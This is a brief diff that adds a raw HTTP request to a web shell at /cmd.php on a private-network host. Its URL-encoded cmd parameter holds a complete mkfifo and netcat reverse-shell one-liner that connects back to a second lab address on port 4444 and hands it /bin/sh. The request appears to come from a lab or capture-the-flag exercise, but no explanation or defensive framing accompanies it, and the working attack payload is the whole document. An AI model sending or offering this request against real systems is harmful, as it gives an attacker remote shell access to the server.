@@ -1,0 +1,3 @@
+GET /cmd.php?cmd=mkfifo%20/tmp/xeuvdr%3b%20nc%20192.168.92.129%204444%200%3c/tmp/xeuvdr%20%7c%20/bin/sh%20%3e/tmp/xeuvdr%202%3e%261%3b%20rm%20/tmp/xeuvdr HTTP/1.1
+Host: 192.168.92.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
